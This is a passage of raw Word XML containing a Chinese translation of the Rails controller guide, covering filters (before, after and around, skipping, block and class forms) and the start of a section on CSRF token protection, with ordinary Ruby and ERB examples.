    <w:p w14:paraId="1AB0385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过滤器是被继承的，因此如果你设置一个过滤器在 </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>ApplicationController</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> ，它会在你的应用的每一个过滤器中运行。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="756E2F3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前过滤器可能会终止请求周期。一种常见的前过滤器是需要用户登录后动作才会运行。你可以如此定义过滤器方法：</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="8522"/>
      </w:tblGrid>
      <w:tr w:rsidR="006E53E9" w:rsidRPr="006E53E9" w14:paraId="3B463675" w14:textId="77777777" w:rsidTr="001A6006">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="1F16CB2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ApplicationController &lt; ActionController::Base</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="487CF74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before_filter :require_login</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7D2743A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665AFD8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private</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4BBC6C1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168AD47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require_login</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6704CE1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unless</w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>logged_in?</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3E63166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flash[:error] = "You must be logged in to access this section"</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7A605E2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redirect_to new_login_url # halts request cycle</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5E085F4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023CC6B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70A1429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75844CF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logged_in? 方法简单地返回 true 如果用户已登录，否则返回 false 。</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6F8A3DE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它通过使用一个双 ! 操作符来“布尔化”我们之前创建的 current_user 方法。</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2574D4F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注意在 Ruby 中者不常见也不鼓励，除非你真的想要转换某物到 true 或 false 。</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0E1A63F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logged_in?</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="257AC87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!!current_user</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="726931C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48A69F9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0FA3F9F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如果用户没有登录，该方法简单地存储一条错误信息在闪存中然后重定向到登录表单。如果在该过滤器之后还有其他更多的过滤器，它们也会被取消。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="20B9ACA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在此例中过滤器被添加到 </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>ApplicationController</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 中因此应用中的所有控制器都要继承它。这将使得应用中的所有操作都需要用户已登录才能使用。基于明显的原因（用户最初无法登录），不是所有控制器或动作都应该需要它。在特定的动作中使用 </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>skip_before_filter</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 你可以阻止这个过滤器运行：</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="7776"/>
      </w:tblGrid>
      <w:tr w:rsidR="006E53E9" w:rsidRPr="006E53E9" w14:paraId="524CAF6D" w14:textId="77777777" w:rsidTr="001A6006">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="0E20A14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LoginsController &lt; ApplicationController</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="14D75C1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skip_before_filter :require_login, :only</w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>=&gt; [:new, :create]</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="24F47C2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62F2C3B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现在，</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>LoginController</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 的 </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>new</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 和 </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>create</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 动作将会不需要用户已登录也能工作。</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>:only</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 选项是指仅在指定的动作中跳过过滤器，还有一个 </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>:except</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 选项正好相反。这些选项也可以被用在添加过滤器时，所以你可以添加一个在建立是就只在选择的动作中运行的过滤器。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="164AF22A"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7.1 后过滤器与前后过滤器</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5438EEF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除了前过滤器以外，你也可以在一个动作被执行之后运行过滤器，或之前和之后都运行。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2733DB3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后过滤器和前过滤器相似，但因为动作已经被运行，它们已经存取过准备发送给客户的响应数据。后过滤器显然不能阻止动作运行。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0B6E696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前后过滤器通过yield来负责运行它们协助的动作，类似 Rack 中间件的工作方式。Around filters are responsible for running their associated actions by yielding, similar to how Rack middlewares work.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="25CEA81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举例来说，管理员能轻松预览在一个网站中哪里改变了的一个批准流程 ，只要应用它们到一个事务中:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="6696"/>
      </w:tblGrid>
      <w:tr w:rsidR="006E53E9" w:rsidRPr="006E53E9" w14:paraId="633169A2" w14:textId="77777777" w:rsidTr="001A6006">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="0413C7D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ChangesController &lt; ActionController::Base</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="05E52C4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around_filter :wrap_in_transaction, :only</w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>=&gt; :show</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="43E0CF6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2282597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private</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7DAE43E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216EE3E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wrap_in_transaction</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="362B0F8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ActiveRecord::Base.transaction do</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2CFFA7B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begin</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="66D263C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yield</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="304BE2D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ensure</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6A4A993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raise</w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>ActiveRecord::Rollback</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4AE3B80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1D17CC7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350BEEF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25DB254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79AE541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注意前后过滤器也包裹了渲染。在实践中，如果上例的视图本身通过一个 scope 或是什么从数据库读取，它会在事务中这么做以呈现数据来预览。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2FDC502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也可以选择不 yield 并自己构建响应，这样动作不会被运行。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="31FB5D01"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7.2 使用过滤器的其他方式</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="132BC6B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尽管使用过滤器最为常见的方式是创建私有方法然后使用 *_filter 方法添加它们，还有两种其他的方式可以做到同样的事情。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1173C5D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第一种方法是在 *_filter 方法中直接使用一个 block 。 block 接受 controller 为一个参数，使用 block 上例中 </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>require_login</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 过滤器也可以重写成：</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="8496"/>
      </w:tblGrid>
      <w:tr w:rsidR="006E53E9" w:rsidRPr="006E53E9" w14:paraId="30997036" w14:textId="77777777" w:rsidTr="001A6006">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="2179445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ApplicationController &lt; ActionController::Base</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="443E72E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before_filter do</w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>|controller|</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2ACBBAF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redirect_to new_login_url unless</w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>controller.send(:logged_in?)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="64D0CA3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38EB293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09728EC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注意此例中过滤器使用 </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>send</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 因为 </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>logged_in?</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 方法是私有的，而过滤器不是运行于控制器的作用域中。此过滤器的这种实现是不被推荐的，但是对于简单一些的情况，它可能很有用。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0ADD176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第二种方式是使用一个类别（事实上，响应正确方法的任何对象就可以）来处理过滤。在更复杂并且在使用其他两种方式时无法做到可读性和重用性时，它非常有用。举例来说，你可以使用类别重写登录过滤器：</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="7656"/>
      </w:tblGrid>
      <w:tr w:rsidR="006E53E9" w:rsidRPr="006E53E9" w14:paraId="0F682601" w14:textId="77777777" w:rsidTr="001A6006">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="5ED6B3F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ApplicationController &lt; ActionController::Base</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6DC2C86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before_filter LoginFilter</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="648EB75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p w14:paraId="521C46C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21D3B5F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LoginFilter</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="51F828E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self.filter(controller)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="384723C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unless</w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>controller.send(:logged_in?)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1C336F2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controller.flash[:error] = "You must be logged in"</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7C3C861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controller.redirect_to controller.new_login_url</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="38F1B09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2B0FA72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128B91E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2986AFD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再一次，对于这个过滤器，它不是一个理想的例子，因为它不运行于控制器的作用域中而是通过参数传递得到控制器。过滤器类别有一个运行在动作之前或之后的类别方法 </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>filter</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> ，取决于它是一个前过滤器还是后过滤器。被用于前后过滤器的类别也可以使用相同的 </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>filter</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 方法，它也会同样运行。该方法必须 </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>yield</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 来执行动作。或者，它可以有一个 </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>before</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 和一个 </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>after</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 方法运行于动作之前和之后。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2F1546F1"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8 请求伪造保护</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5E4F51F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跨站请求伪造是一种一个站点欺骗用户生成在另一个站点的请求的攻击方式，可能会在未经用户知晓或同意的情况下添加，修改或删除站上数据。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2409007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避免此攻击的第一步是确保所有“破坏性的”动作（增，改，删）只能通过非 GET 请求来实现。如果你遵循 RESTful 约定那么你已经在这么做了。然而，恶意站点仍然可以轻易发送一个非 GET 请求到你的站点，这就是请求伪造保护介入的时候了。顾名思义，它保护你免受伪造的请求的欺骗。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0864DAB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它做到这个的方法是对每个请求增加一个只被你的服务器知道的、不可猜的标志。这样，如果一个请求没有合适的标志，它会被拒绝接入。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2027320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如果你像这样生成一个表单：</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="4176"/>
      </w:tblGrid>
      <w:tr w:rsidR="006E53E9" w:rsidRPr="006E53E9" w14:paraId="714D6AAD" w14:textId="77777777" w:rsidTr="001A6006">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="1AB76CC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 form_for @user</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r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>|f| %&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="09D491D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 f.text_field :username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3AEAC70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&lt;%= f.text_field :password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p w14:paraId="5BE1678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 end</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4202575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你会看到标志作为一个隐藏的 field 被加到其中:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="7656"/>
      </w:tblGrid>
      <w:tr w:rsidR="006E53E9" w:rsidRPr="006E53E9" w14:paraId="0437579D" w14:textId="77777777" w:rsidTr="001A6006">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="6EDEC05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w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>accept-charset="UTF-8"</w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>action="/users/1"</w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
